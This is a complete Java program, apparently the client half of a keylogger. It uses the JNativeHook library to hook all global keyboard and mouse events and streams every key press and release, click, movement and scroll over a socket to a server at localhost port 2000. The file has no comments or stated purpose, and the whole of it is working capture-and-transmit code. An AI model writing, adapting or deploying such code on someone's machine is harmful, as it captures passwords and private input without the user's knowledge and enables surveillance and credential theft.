import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseInputListener;
import org.jnativehook.mouse.NativeMouseWheelEvent;
import org.jnativehook.mouse.NativeMouseWheelListener;

import java.io.*;
import java.net.Socket;


public class Client implements NativeKeyListener, NativeMouseInputListener, NativeMouseWheelListener{
    private static FileWriter filewriter;
    private static BufferedWriter bufferedWriter;
    private static ObjectOutputStream objectOutputStream;


    public static void main(String[] args) throws NativeHookException, IOException {
        Socket socket = new Socket("localhost", 2000);
        objectOutputStream = new ObjectOutputStream(socket.getOutputStream());

        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(new Client());
        GlobalScreen.addNativeMouseListener(new Client());
        GlobalScreen.addNativeMouseMotionListener(new Client());
        GlobalScreen.addNativeMouseWheelListener(new Client());

    }


    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }



    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        try {
            objectOutputStream.writeUTF("Key Pressed: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
            objectOutputStream.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        try {
            objectOutputStream.writeUTF("Key Released: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
            objectOutputStream.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    @Override
    public void nativeMouseClicked(NativeMouseEvent nativeMouseEvent) {
    }


    @Override
    public void nativeMousePressed(NativeMouseEvent nativeMouseEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Pressed");
            objectOutputStream.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    @Override
    public void nativeMouseReleased(NativeMouseEvent nativeMouseEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Released");
            objectOutputStream.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    @Override
    public void nativeMouseMoved(NativeMouseEvent nativeMouseEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Index (X-axis,Y-axis): " + nativeMouseEvent.getX() + ", " + nativeMouseEvent.getY());
            objectOutputStream.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    @Override
    public void nativeMouseDragged(NativeMouseEvent nativeMouseEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Dragged to: " + nativeMouseEvent.getX() + ", " + nativeMouseEvent.getY());
            objectOutputStream.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }



    @Override
    public void nativeMouseWheelMoved(NativeMouseWheelEvent nativeMouseWheelEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Wheel Moved: " + nativeMouseWheelEvent.getWheelRotation());
            objectOutputStream.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            objectOutputStream.writeUTF("Scroll Amount: " +nativeMouseWheelEvent.getScrollAmount());
            objectOutputStream.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }


        try {
            objectOutputStream.writeUTF("Wheel Direction: " +nativeMouseWheelEvent.getWheelDirection());
            objectOutputStream.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}